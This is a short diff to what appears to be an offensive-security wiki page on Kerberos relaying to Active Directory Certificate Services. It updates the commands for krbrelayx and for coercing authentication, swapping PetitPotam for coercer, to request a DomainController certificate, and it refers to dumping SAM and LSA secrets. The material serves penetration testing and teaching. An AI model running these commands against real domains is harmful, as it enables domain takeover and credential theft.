@@ -109,10 +109,10 @@ dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAA
 
 ```bash
 # In a first terminal, krbrelayx waiting for an authentication to relay
-krbrelayx.py -t 'http://$ADCS_FQDN/certsrv/certfnsh.asp' --adcs --template DomainController -v '$RELAYED_TARGET_SAMNAME'
+krbrelayx.py -t "http://$CA/certsrv/certfnsh.asp" --adcs --template DomainController -v "$RELAYED_TARGET_SAMNAME"
 
 # In a second terminal, coerce the victim authentication to the DNS record
-Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
+coercer coerce -t $TARGET_IP -l "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
 ```
 
 In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md):
